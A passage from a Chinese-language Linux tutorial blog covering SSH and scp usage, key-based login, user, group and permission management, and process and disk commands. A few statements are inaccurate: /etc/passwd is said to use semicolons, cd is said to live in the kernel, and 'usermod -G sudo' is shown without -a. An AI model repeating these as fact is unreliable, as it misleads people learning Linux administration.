<code>22</code>，如果是默认端口号，在连接的时候，可以省略</li></ul></li><li>常见服务端口号列表：</li></ul><table><thead><tr><th>序号</th><th>服务</th><th>端口号</th></tr></thead><tbody><tr><td>01</td><td>SSH 服务器</td><td>22</td></tr><tr><td>02</td><td>Web 服务器</td><td>80</td></tr><tr><td>03</td><td>HTTPS</td><td>443</td></tr><tr><td>04</td><td>FTP 服务器</td><td>21</td></tr></tbody></table><blockquote><p>提示：有关 <strong>端口号</strong>的详细内容，在就业班会详细讲解！</p></blockquote><h4 id="2-SSH-客户端的简单使用"><a href="#2-SSH-客户端的简单使用" class="headerlink" title="2) SSH 客户端的简单使用"></a>2) SSH 客户端的简单使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh [-p port] user@remote</span><br></pre></td></tr></table></figure><ul><li><code>user</code> 是在远程机器上的用户名，如果不指定的话默认为当前用户</li><li><code>remote</code> 是远程机器的地址，可以是 <strong>IP</strong>／<strong>域名</strong>，或者是 <strong>后面会提到的别名</strong></li><li><code>port</code> 是 <strong>SSH Server 监听的端口</strong>，如果不指定，就为默认值 <code>22</code></li></ul><blockquote><p>提示：</p><ul><li>使用 <code>exit</code> 退出当前用户的登录</li></ul><p>注意：</p><ul><li><code>ssh</code> 这个终端命令只能在 <code>Linux</code> 或者 <code>UNIX</code> 系统下使用</li><li>如果在 <code>Windows</code> 系统中，可以安装 <code>PuTTY</code> 或者 <code>XShell</code> 客户端软件即可</li></ul><p>提示：</p><ul><li>在工作中，SSH 服务器的端口号很有可能<strong>不是 22</strong>，如果遇到这种情况就需要使用 <code>-p</code> 选项，指定正确的端口号，否则无法正常连接到服务器</li></ul></blockquote><h4 id="3-Windows-下-SSH-客户端的安装"><a href="#3-Windows-下-SSH-客户端的安装" class="headerlink" title="3) Windows 下 SSH 客户端的安装"></a>3) Windows 下 SSH 客户端的安装</h4><ul><li><code>Putty</code> <a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">http://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></li><li><code>XShell</code> <a href="http://xshellcn.com/">http://xshellcn.com</a></li></ul><blockquote><p>建议从官方网站下载正式的安装程序</p></blockquote><h3 id="3-2-scp（掌握）"><a href="#3-2-scp（掌握）" class="headerlink" title="3.2 scp（掌握）"></a>3.2 <code>scp</code>（掌握）</h3><ul><li>scp 就是 <code>secure copy</code>，是一个在 Linux 下用来进行 <strong>远程拷贝文件</strong> 的命令</li><li>它的<strong>地址格式与 ssh 基本相同</strong>，<strong>需要注意的是</strong>，在指定端口时用的是大写的 <code>-P</code> 而不是小写的</li></ul><center><p><img src="/2018/05/10/Linux%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/002_SCP%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把本地当前目录下的 01.py 文件 复制到 远程 家目录下的 Desktop/01.py</span></span><br><span class="line"><span class="comment"># 注意：`:` 后面的路径如果不是绝对路径，则以用户的家目录作为参照路径</span></span><br><span class="line">scp -P port 01.py user@remote:Desktop/01.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把远程 家目录下的 Desktop/01.py 文件 复制到 本地当前目录下的 01.py</span></span><br><span class="line">scp -P port user@remote:Desktop/01.py 01.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加上 -r 选项可以传送文件夹</span></span><br><span class="line"><span class="comment"># 把当前目录下的 demo 文件夹 复制到 远程 家目录下的 Desktop</span></span><br><span class="line">scp -r demo user@remote:Desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把远程 家目录下的 Desktop 复制到 当前目录下的 demo 文件夹</span></span><br><span class="line">scp -r user@remote:Desktop demo</span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-r</td><td>若给出的源文件是目录文件，则 scp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</td></tr><tr><td>-P</td><td>若远程 SSH 服务器的端口不是 22，需要使用大写字母 -P 选项指定端口</td></tr></tbody></table><blockquote><p>注意：</p><ul><li><code>scp</code> 这个终端命令只能在 <code>Linux</code> 或者 <code>UNIX</code> 系统下使用</li><li>如果在 <code>Windows</code> 系统中，可以安装 <code>PuTTY</code>，使用 <code>pscp</code> 命令行工具或者安装 <code>FileZilla</code> 使用 <code>FTP</code> 进行文件传输</li></ul></blockquote><h4 id="FileZilla"><a href="#FileZilla" class="headerlink" title="FileZilla"></a><code>FileZilla</code></h4><ul><li>官方网站：<a href="https://www.filezilla.cn/download/client">https://www.filezilla.cn/download/client</a></li><li><code>FileZilla</code> 在传输文件时，使用的是 <code>FTP 服务</code> 而不是 <code>SSH 服务</code>，因此端口号应该设置为 <code>21</code></li></ul><h3 id="3-3-SSH-高级（知道）"><a href="#3-3-SSH-高级（知道）" class="headerlink" title="3.3 SSH 高级（知道）"></a>3.3 SSH 高级（知道）</h3><ul><li>免密码登录</li><li>配置别名</li></ul><blockquote><p>提示：有关 SSH 配置信息都保存在用户家目录下的 <code>.ssh</code> 目录下</p></blockquote><h4 id="1）免密码登录"><a href="#1）免密码登录" class="headerlink" title="1）免密码登录"></a>1）免密码登录</h4><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><ul><li>配置公钥<ul><li>执行 <code>ssh-keygen</code> 即可生成 SSH 钥匙，一路回车即可</li></ul></li><li>上传公钥到服务器<ul><li>执行 <code>ssh-copy-id -p port user@remote</code>，可以让远程服务器记住我们的公钥</li></ul></li></ul><h5 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h5><center><p>![](Linux远程管理常用命令/003_SSH 免密码示意图.png)</p></center><blockquote><p>非对称加密算法</p><ul><li>使用 <strong>公钥</strong> 加密的数据，需要使用 <strong>私钥</strong> 解密</li><li>使用 <strong>私钥</strong> 加密的数据，需要使用 <strong>公钥</strong> 解密</li></ul></blockquote><h4 id="2-配置别名"><a href="#2-配置别名" class="headerlink" title="2) 配置别名"></a>2) 配置别名</h4><p>每次都输入 <code>ssh -p port user@remote</code>，时间久了会觉得很麻烦，特别是当 <code>user</code>, <code>remote</code> 和 <code>port</code> 都得输入，而且还不好记忆</p><p>而 <strong>配置别名</strong> 可以让我们进一步偷懒，譬如用：<code>ssh mac</code> 来替代上面这么一长串，那么就在 <code>~/.ssh/config</code> 里面追加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host mac</span><br><span class="line">    HostName ip地址</span><br><span class="line">    User itheima</span><br><span class="line">    Port 22</span><br></pre></td></tr></table></figure><p><strong>保存之后，即可用 <code>ssh mac</code> 实现远程登录了，<code>scp</code> 同样可以使用</strong></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux远程管理常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux用户权限相关命令</title>
      <link href="/2018/05/10/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/05/10/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="用户权限相关命令"><a href="#用户权限相关命令" class="headerlink" title="用户权限相关命令"></a>用户权限相关命令</h1><a id="more"></a><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li><strong>用户</strong> 和 <strong>权限</strong> 的基本概念</li><li><strong>用户管理</strong> 终端命令</li><li><strong>组管理</strong> 终端命令</li><li><strong>修改权限</strong> 终端命令</li></ul><h2 id="01-用户-和-权限-的基本概念"><a href="#01-用户-和-权限-的基本概念" class="headerlink" title="01. 用户 和 权限 的基本概念"></a>01. <strong>用户</strong> 和 <strong>权限</strong> 的基本概念</h2><h3 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h3><ul><li><strong>用户</strong> 是 Linux 系统工作中重要的一环，用户管理包括 <strong>用户</strong> 与 <strong>组</strong> 管理</li><li>在 Linux 系统中，不论是由本机或是远程登录系统，每个系统都<strong>必须拥有一个账号</strong>，并且<strong>对于不同的系统资源拥有不同的使用权限</strong></li><li>在 Linux 中，可以指定 <strong>每一个用户</strong> 针对 <strong>不同的文件或者目录</strong> 的 <strong>不同权限</strong></li><li>对 <strong>文件／目录</strong> 的权限包括：</li></ul><table><thead><tr><th align="center">序号</th><th align="center">权限</th><th align="center">英文</th><th align="center">缩写</th><th align="center">数字代号</th></tr></thead><tbody><tr><td align="center">01</td><td align="center">读</td><td align="center">read</td><td align="center">r</td><td align="center">4</td></tr><tr><td align="center">02</td><td align="center">写</td><td align="center">write</td><td align="center">w</td><td align="center">2</td></tr><tr><td align="center">03</td><td align="center">执行</td><td align="center">excute</td><td align="center">x</td><td align="center">1</td></tr></tbody></table><h3 id="1-2-组"><a href="#1-2-组" class="headerlink" title="1.2 组"></a>1.2 组</h3><ul><li>为了方便用户管理，提出了 <strong>组</strong> 的概念，如下图所示</li></ul><center><p><img src="/2018/05/10/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/001_%E7%BB%84%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><ul><li>在实际应用中，可以预先针对 <strong>组</strong> 设置好权限，然后 <strong>将不同的用户添加到对应的组中</strong>，从而<strong>不用依次为每一个用户设置权限</strong></li></ul><h3 id="1-3-ls-l-扩展"><a href="#1-3-ls-l-扩展" class="headerlink" title="1.3 ls -l 扩展"></a>1.3 ls -l 扩展</h3><ul><li><code>ls -l</code> 可以查看文件夹下文件的详细信息，从左到右依次是：<ul><li><strong>权限</strong>，第 1 个字符如果是 <code>d</code> 表示目录</li><li><strong>硬链接数</strong>，通俗地讲，就是有多少种方式，可以访问到当前目录／文件</li><li><strong>拥有者</strong>，家目录下 文件／目录 的拥有者通常都是当前用户</li><li><strong>组</strong>，在 Linux 中，很多时候，会出现组名和用户名相同的情况，后续会讲</li><li><strong>大小</strong></li><li><strong>时间</strong></li><li><strong>名称</strong></li></ul></li></ul><p><img src="/2018/05/10/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/Users/HSAEE/Desktop/python学习/Linux_Basic/linux/media/14934198815905/002_%E6%9D%83%E9%99%90%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="002_权限示意图"></p><h3 id="1-4-chmod-简单使用（重要）"><a href="#1-4-chmod-简单使用（重要）" class="headerlink" title="1.4 chmod 简单使用（重要）"></a>1.4 <code>chmod</code> 简单使用（重要）</h3><ul><li><code>chmod</code> 可以修改 <strong>用户／组</strong> 对 <strong>文件／目录</strong> 的权限</li><li>命令格式如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +/-rwx 文件名|目录名</span><br></pre></td></tr></table></figure><blockquote><p>提示：以上方式会一次性修改 <code>拥有者</code> / <code>组</code> 权限，有关 <code>chmod</code> 的高级用法，后续会讲</p></blockquote><h3 id="1-5-超级用户"><a href="#1-5-超级用户" class="headerlink" title="1.5 超级用户"></a>1.5 超级用户</h3><ul><li>Linux 系统中的 <code>root</code> 账号通常 <strong>用于系统的维护和管理</strong>，对操作系统的所有资源 <strong>具有所有访问权限</strong></li><li>在大多数版本的 Linux 中，都不推荐 <strong>直接使用 root 账号登录系统</strong></li><li>在 Linux 安装的过程中，系统会自动创建一个用户账号，而这个默认的用户就称为“标准用户”</li></ul><h4 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h4><ul><li><code>su</code> 是 <code>substitute user</code> 的缩写，表示 <strong>使用另一个用户的身份</strong></li><li><code>sudo</code> 命令用来以其他身份来执行命令，预设的身份为 <code>root</code></li><li>用户使用 <code>sudo</code> 时，必须先输入密码，之后有 <strong>5 分钟的有效期限</strong>，超过期限则必须重新输入密码</li></ul><blockquote><p>若其未经授权的用户企图使用 <code>sudo</code>，则会发出警告邮件给管理员</p></blockquote><h2 id="02-组管理-终端命令"><a href="#02-组管理-终端命令" class="headerlink" title="02. 组管理 终端命令"></a>02. <strong>组管理</strong> 终端命令</h2><blockquote><p>提示：<strong>创建组</strong> / <strong>删除组</strong> 的终端命令都需要通过 <code>sudo</code> 执行</p></blockquote><table><thead><tr><th>序号</th><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>groupadd 组名</td><td>添加组</td></tr><tr><td>02</td><td>groupdel 组名</td><td>删除组</td></tr><tr><td>03</td><td>cat /etc/group</td><td>确认组信息</td></tr><tr><td>04</td><td>chgrp -R 组名 文件/目录名</td><td>递归修改文件/目录的所属组</td></tr></tbody></table><blockquote><p>提示：</p><ul><li>组信息保存在 <code>/etc/group</code> 文件中</li><li><code>/etc</code> 目录是专门用来保存 <strong>系统配置信息</strong> 的目录</li></ul></blockquote><center><p><img src="/2018/05/10/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/001_%E7%BB%84%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><ul><li>在实际应用中，可以预先针对 <strong>组</strong> 设置好权限，然后 <strong>将不同的用户添加到对应的组中</strong>，从而<strong>不用依次为每一个用户设置权限</strong></li></ul><h4 id="演练目标"><a href="#演练目标" class="headerlink" title="演练目标"></a>演练目标</h4><ol><li>在 <code>python</code> 用户的桌面文件夹下创建 <code>Python学习</code> 目录</li><li>新建 <code>dev</code> 组</li><li>将 <code>Python学习</code> 目录的组修改为 <code>dev</code></li></ol><h2 id="03-用户管理-终端命令"><a href="#03-用户管理-终端命令" class="headerlink" title="03. 用户管理 终端命令"></a>03. <strong>用户管理</strong> 终端命令</h2><blockquote><p>提示：<strong>创建用户</strong> / <strong>删除用户</strong> / <strong>修改其他用户密码</strong> 的终端命令都需要通过 <code>sudo</code> 执行</p></blockquote><h3 id="3-1-创建用户／设置密码／删除用户"><a href="#3-1-创建用户／设置密码／删除用户" class="headerlink" title="3.1 创建用户／设置密码／删除用户"></a>3.1 创建用户／设置密码／删除用户</h3><table><thead><tr><th>序号</th><th>命令</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>01</td><td>useradd -m -g 组 新建用户名</td><td>添加新用户</td><td><ul><li>-m 自动建立用户家目录</li><li>-g 指定用户所在的组，否则会建立一个和同名的组</li></ul></td></tr><tr><td>02</td><td>passwd 用户名</td><td>设置用户密码</td><td>如果是普通用户，直接用 passwd 可以修改自己的账户密码</td></tr><tr><td>03</td><td>userdel -r 用户名</td><td>删除用户</td><td>-r 选项会自动删除用户家目录</td></tr><tr><td>04</td><td>cat /etc/passwd | grep 用户名</td><td>确认用户信息</td><td>新建用户后，用户信息会保存在 /etc/passwd 文件中</td></tr></tbody></table><blockquote><p>提示：</p><ul><li>创建用户时，如果忘记添加 <code>-m</code> 选项指定新用户的家目录 —— 最简单的方法就是<strong>删除用户，重新创建</strong></li><li>创建用户时，默认会创建一个和<strong>用户名</strong>同名的<strong>组名</strong></li><li>用户信息保存在 <code>/etc/passwd</code> 文件中</li></ul></blockquote><h3 id="3-2-查看用户信息"><a href="#3-2-查看用户信息" class="headerlink" title="3.2 查看用户信息"></a>3.2 查看用户信息</h3><table><thead><tr><th>序号</th><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>id [用户名]</td><td>查看用户 UID 和 GID 信息</td></tr><tr><td>02</td><td>who</td><td>查看当前所有登录的用户列表</td></tr><tr><td>03</td><td>whoami</td><td>查看当前登录用户的账户名</td></tr></tbody></table><h4 id="passwd-文件"><a href="#passwd-文件" class="headerlink" title="passwd 文件"></a>passwd 文件</h4><p><code>/etc/passwd</code> 文件存放的是用户的信息，由 6 个分号组成的 7 个信息，分别是</p><ol><li>用户名</li><li>密码（x，表示加密的密码）</li><li>UID（用户标识）</li><li>GID（组标识）</li><li>用户全名或本地帐号</li><li>家目录</li><li>登录使用的 Shell，就是登录之后，使用的终端命令，<code>ubuntu</code> 默认是 <code>dash</code></li></ol><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><ul><li><code>usermod</code> 可以用来设置 <strong>用户</strong> 的 <strong>主组</strong> ／ <strong>附加组</strong> 和 <strong>登录 Shell</strong>，命令格式如下：</li><li><strong>主组</strong>：通常在新建用户时指定，在 <code>etc/passwd</code> 的第 4 列 <strong>GID 对应的组</strong></li><li><strong>附加组</strong>：在 <code>etc/group</code> 中最后一列表示该组的用户列表，用于指定 <strong>用户的附加权限</strong></li></ul><blockquote><p>提示：设置了用户的附加组之后，需要重新登录才能生效！</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改用户的主组（passwd 中的 GID）</span></span><br><span class="line">usermod -g 组 用户名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改用户的附加组</span></span><br><span class="line">usermod -G 组 用户名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改用户登录 Shell</span></span><br><span class="line">usermod -s /bin/bash 用户名</span><br></pre></td></tr></table></figure><blockquote><p>注意：默认使用 <code>useradd</code> 添加的用户是没有权限使用 <code>sudo</code> 以 <code>root</code> 身份执行命令的，可以使用以下命令，将用户添加到 <code>sudo</code> 附加组中</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -G sudo 用户名</span><br></pre></td></tr></table></figure><h4 id="which（重要）"><a href="#which（重要）" class="headerlink" title="which（重要）"></a>which（重要）</h4><blockquote><p>提示</p><ul><li><code>/etc/passwd</code> 是用于保存用户信息的文件</li><li><code>/usr/bin/passwd</code> 是用于修改用户密码的程序</li></ul></blockquote><ul><li><code>which</code> 命令可以查看执行命令所在位置，例如：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># /bin/ls</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">which</span> useradd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># /usr/sbin/useradd</span></span><br></pre></td></tr></table></figure><h5 id="bin-和-sbin"><a href="#bin-和-sbin" class="headerlink" title="bin 和 sbin"></a><code>bin</code> 和 <code>sbin</code></h5><ul><li>在 <code>Linux</code> 中，绝大多数可执行文件都是保存在 <code>/bin</code>、<code>/sbin</code>、<code>/usr/bin</code>、<code>/usr/sbin</code></li><li><code>/bin</code>（<code>binary</code>）是二进制执行文件目录，主要用于具体应用</li><li><code>/sbin</code>（<code>system binary</code>）是系统管理员专用的二进制代码存放目录，主要用于系统管理</li><li><code>/usr/bin</code>（<code>user commands for applications</code>）后期安装的一些软件</li><li><code>/usr/sbin</code>（<code>super user commands for applications</code>）超级用户的一些管理程序</li></ul><blockquote><p>提示：</p><ul><li><code>cd</code> 这个终端命令是内置在系统内核中的，没有独立的文件，因此用 <code>which</code> 无法找到 <code>cd</code> 命令的位置</li></ul></blockquote><h3 id="3-3-切换用户"><a href="#3-3-切换用户" class="headerlink" title="3.3 切换用户"></a>3.3 切换用户</h3><table><thead><tr><th>序号</th><th>命令</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>01</td><td>su - 用户名</td><td>切换用户，并且切换目录</td><td>- 可以切换到用户家目录，否则保持位置不变</td></tr><tr><td>02</td><td>exit</td><td>退出当前登录账户</td><td></td></tr></tbody></table><ul><li><code>su</code> 不接用户名，可以切换到 <code>root</code>，但是不推荐使用，因为不安全</li><li><code>exit</code> 示意图如下：</li></ul><center><p><img src="/2018/05/10/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/003_su%E5%92%8Cexit%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><h2 id="04-修改文件权限"><a href="#04-修改文件权限" class="headerlink" title="04. 修改文件权限"></a>04. 修改文件权限</h2><table><thead><tr><th>序号</th><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>chown</td><td>修改拥有者</td></tr><tr><td>02</td><td>chgrp</td><td>修改组</td></tr><tr><td>03</td><td>chmod</td><td>修改权限</td></tr></tbody></table><ul><li>命令格式如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改文件|目录的拥有者</span></span><br><span class="line">chown 用户名 文件名|目录名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归修改文件|目录的组</span></span><br><span class="line">chgrp -R 组名 文件名|目录名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归修改文件权限</span></span><br><span class="line">chmod -R 755 文件名|目录名</span><br></pre></td></tr></table></figure><ul><li><code>chmod</code> 在设置权限时，可以简单地使用三个数字分别对应 <strong>拥有者</strong> ／ <strong>组</strong> 和 <strong>其他</strong> 用户的权限</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接修改文件|目录的 读|写|执行 权限，但是不能精确到 拥有者|组|其他</span></span><br><span class="line">chmod +/-rwx 文件名|目录名</span><br></pre></td></tr></table></figure><center><p><img src="/2018/05/10/Linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/004_%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><ul><li>常见数字组合有（<code>u</code>表示用户／<code>g</code>表示组／<code>o</code>表示其他）：<ul><li><code>777</code> ===&gt; <code>u=rwx,g=rwx,o=rwx</code> </li><li><code>755</code> ===&gt; <code>u=rwx,g=rx,o=rx</code></li><li><code>644</code> ===&gt; <code>u=rw,g=r,o=r</code></li></ul></li></ul><h4 id="chmod-演练目标"><a href="#chmod-演练目标" class="headerlink" title="chmod 演练目标"></a><code>chmod</code> 演练目标</h4><ol><li>将 <code>01.py</code> 的权限修改为 <code>u=rwx,g=rx,o=r</code> </li><li>将 <code>123.txt</code> 的权限修改为 <code>u=rw,g=r,o=-</code> </li><li>将 <code>test</code> 目录以及目录下的 <strong>所有</strong> 文件权限修改为 <code>u=rwx,g=rwx,o=rx</code> </li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux用户权限命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统信息相关命令</title>
      <link href="/2018/05/10/Linux%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/05/10/Linux%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="系统信息相关命令"><a href="#系统信息相关命令" class="headerlink" title="系统信息相关命令"></a>系统信息相关命令</h1><a id="more"></a><ul><li>本节内容主要是为了方便通过远程终端维护服务器时，查看服务器上当前 <strong>系统日期和时间</strong> ／ <strong>磁盘空间占用情况</strong> ／ <strong>程序执行情况</strong></li><li>本小结学习的终端命令基本都是查询命令，通过这些命令对系统资源的使用情况有个了解</li></ul><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>时间和日期<ul><li><code>date</code></li><li><code>cal</code></li></ul></li><li>磁盘和目录空间<ul><li><code>df</code></li><li><code>du</code></li></ul></li><li>进程信息<ul><li><code>ps</code></li><li><code>top</code></li><li><code>kill</code></li></ul></li></ul><h2 id="01-时间和日期"><a href="#01-时间和日期" class="headerlink" title="01. 时间和日期"></a>01. 时间和日期</h2><table><thead><tr><th>序号</th><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>date</td><td>查看系统时间</td></tr><tr><td>02</td><td>cal</td><td><code>calendar</code> 查看日历，<code>-y</code> 选项可以查看一年的日历</td></tr></tbody></table><h2 id="02-磁盘信息"><a href="#02-磁盘信息" class="headerlink" title="02. 磁盘信息"></a>02. 磁盘信息</h2><table><thead><tr><th>序号</th><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>df -h</td><td><code>disk free</code> 显示磁盘剩余空间</td></tr><tr><td>02</td><td>du -h [目录名]</td><td><code>disk usage</code> 显示目录下的文件大小</td></tr></tbody></table><ul><li>选项说明</li></ul><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>-h</td><td>以人性化的方式显示文件大小</td></tr></tbody></table><h2 id="03-进程信息"><a href="#03-进程信息" class="headerlink" title="03. 进程信息"></a>03. 进程信息</h2><ul><li>所谓 <strong>进程</strong>，通俗地说就是 <strong>当前正在执行的一个程序</strong></li></ul><table><thead><tr><th>序号</th><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>ps aux</td><td><code>process status</code> 查看进程的详细状况</td></tr><tr><td>02</td><td>top</td><td>动态显示运行中的进程并且排序</td></tr><tr><td>03</td><td>kill [-9] 进程代号</td><td>终止指定代号的进程，<code>-9</code> 表示强行终止</td></tr></tbody></table><blockquote><p><code>ps</code> 默认只会显示当前用户通过终端启动的应用程序</p></blockquote><ul><li><code>ps</code> 选项说明</li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>a</td><td>显示终端上的所有进程，包括其他用户的进程</td></tr><tr><td>u</td><td>显示进程的详细状态</td></tr><tr><td>x</td><td>显示没有控制终端的进程</td></tr></tbody></table><blockquote><p>提示：使用 <code>kill</code> 命令时，最好只终止由当前用户开启的进程，而不要终止 <code>root</code> 身份开启的进程，否则可能导致系统崩溃</p></blockquote><blockquote><ul><li>要退出 <code>top</code> 可以直接输入 <code>q</code></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统信息相关命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件和目录常用命令</title>
      <link href="/2018/05/10/Linux%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/05/10/Linux%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="文件和目录常用命令"><a href="#文件和目录常用命令" class="headerlink" title="文件和目录常用命令"></a>文件和目录常用命令</h1><a id="more"></a><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>查看目录内容<ul><li><code>ls</code></li></ul></li><li>切换目录<ul><li><code>cd</code></li></ul></li><li>创建和删除操作<ul><li><code>touch</code></li><li><code>rm</code></li><li><code>mkdir</code></li></ul></li><li>拷贝和移动文件<ul><li><code>cp</code></li><li><code>mv</code></li></ul></li><li>查看文件内容<ul><li><code>cat</code></li><li><code>more</code></li><li><code>grep</code></li></ul></li><li>其他<ul><li><code>echo</code></li><li>重定向 <code>&gt;</code> 和 <code>&gt;&gt;</code></li><li>管道 <code>|</code></li></ul></li></ul><h2 id="01-查看目录内容"><a href="#01-查看目录内容" class="headerlink" title="01. 查看目录内容"></a>01. 查看目录内容</h2><h3 id="1-1-终端实用技巧"><a href="#1-1-终端实用技巧" class="headerlink" title="1.1 终端实用技巧"></a>1.1 终端实用技巧</h3><h4 id="1-gt-自动补全"><a href="#1-gt-自动补全" class="headerlink" title="1&gt; 自动补全"></a>1&gt; 自动补全</h4><ul><li>在敲出 <code>文件</code>／<code>目录</code>／<code>命令</code> 的前几个字母之后，按下 <code>tab</code> 键<ul><li>如果输入的没有歧义，系统会自动补全</li><li>如果还存在其他 <code>文件</code>／<code>目录</code>／<code>命令</code>，再按一下 <code>tab</code> 键，系统会提示可能存在的命令</li></ul></li></ul><h4 id="2-gt-曾经使用过的命令"><a href="#2-gt-曾经使用过的命令" class="headerlink" title="2&gt; 曾经使用过的命令"></a>2&gt; 曾经使用过的命令</h4><ul><li>按 